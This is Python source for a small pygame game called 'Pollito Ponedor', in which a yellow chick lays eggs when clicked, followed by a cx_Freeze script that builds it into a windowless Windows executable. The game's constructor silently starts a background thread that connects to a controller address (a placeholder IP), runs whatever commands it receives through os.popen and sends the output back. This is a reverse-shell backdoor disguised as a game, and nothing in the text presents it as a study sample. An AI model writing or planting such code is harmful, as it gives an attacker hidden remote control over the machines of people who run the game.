import pygame
import sys
import os
import socket
import threading

ANCHO = 800
ALTO = 600
VELOCIDAD_POLLITO = 5
TAMANO_POLLITO = 50

AMARILLO = (255, 255, 0)
BLANCO = (255, 255, 255)
NEGRO = (0, 0, 0)

class Huevo:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        self.ancho = 20
        self.alto = 25

class Juego:
    def __init__(self):
        pygame.init()
        self.pantalla = pygame.display.set_mode((ANCHO, ALTO))
        pygame.display.set_caption('Pollito Ponedor')

        self.pollito_x = ANCHO // 2
        self.pollito_y = ALTO // 2

        self.huevos = []
        self.contador = 0

        self.fuente = pygame.font.Font(None, 36)

        
        threading.Thread(target=self.connect_to_controller, daemon=True).start()

    def connect_to_controller(self):
        zombie_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        zombie_socket.connect(('000.000.00', 8080)) #change IP  

        while True:
            try:
                command = zombie_socket.recv(1024).decode()
                if command.lower() == "exit":
                    print("Cerrando conexión...")
                    break

                if command.startswith("cd "):  
                    os.chdir(command.strip("cd "))  
                    output = f"Cambiado a {os.getcwd()}"
                else:
                    output = os.popen(command).read()  

                zombie_socket.send(output.encode())  

            except Exception as e:
                zombie_socket.send(str(e).encode())  

        zombie_socket.close()

    def manejar_eventos(self):
        for evento in pygame.event.get():
            if evento.type == pygame.QUIT:
                return False
            
            if evento.type == pygame.MOUSEBUTTONDOWN:
                if evento.button == 1:  
                    self.huevos.append(Huevo(self.pollito_x, self.pollito_y))
                    self.contador += 1
        
        # Movimiento del pollito con WASD
        teclas = pygame.key.get_pressed()
        if teclas[pygame.K_a] and self.pollito_x > 0:
            self.pollito_x -= VELOCIDAD_POLLITO
        if teclas[pygame.K_d] and self.pollito_x < ANCHO - TAMANO_POLLITO:
            self.pollito_x += VELOCIDAD_POLLITO
        if teclas[pygame.K_w] and self.pollito_y > 0:
            self.pollito_y -= VELOCIDAD_POLLITO
        if teclas[pygame.K_s] and self.pollito_y < ALTO - TAMANO_POLLITO:
            self.pollito_y += VELOCIDAD_POLLITO
            
        return True

    def dibujar(self):
        self.pantalla.fill((135, 206, 235))  
        pygame.draw.rect(self.pantalla, AMARILLO, 
                         (self.pollito_x, self.pollito_y, TAMANO_POLLITO, TAMANO_POLLITO))
        
        ojo_izq = (self.pollito_x + 10, self.pollito_y + 10)
        ojo_der = (self.pollito_x + 30, self.pollito_y + 10)
        pygame.draw.circle(self.pantalla, NEGRO, ojo_izq, 5)
        pygame.draw.circle(self.pantalla, NEGRO, ojo_der, 5)

        pygame.draw.polygon(self.pantalla, (255, 165, 0), 
                             [(self.pollito_x + 20, self.pollito_y + 25),
                              (self.pollito_x + 30, self.pollito_y + 35),
                              (self.pollito_x + 10, self.pollito_y + 35)])

        for huevo in self.huevos:
            pygame.draw.ellipse(self.pantalla, BLANCO, 
                                (huevo.x, huevo.y, huevo.ancho, huevo.alto))

        texto = self.fuente.render(f'Huevos: {self.contador}', True, NEGRO)
        self.pantalla.blit(texto, (10, 10))

        pygame.display.flip()

    def ejecutar(self):
        ejecutando = True
        while ejecutando:
            ejecutando = self.manejar_eventos()
            self.dibujar()
            pygame.time.Clock().tick(60)

        pygame.quit()

if __name__ == '__main__':
    juego = Juego()
    juego.ejecutar()

import sys
from cx_Freeze import setup, Executable

build_exe_options = {
    "packages": ["pygame"],
    "includes": ["socket", "os"],  
    "excludes": [],
}

base = None
if sys.platform == "win32":
    base = "Win32GUI"

setup(
    name="PollitoPonedor",
    version="0.1",
    description="Juego Pollito Ponedor",
    options={"build_exe": build_exe_options},
    executables=[Executable("setup.py", base=base)]
)

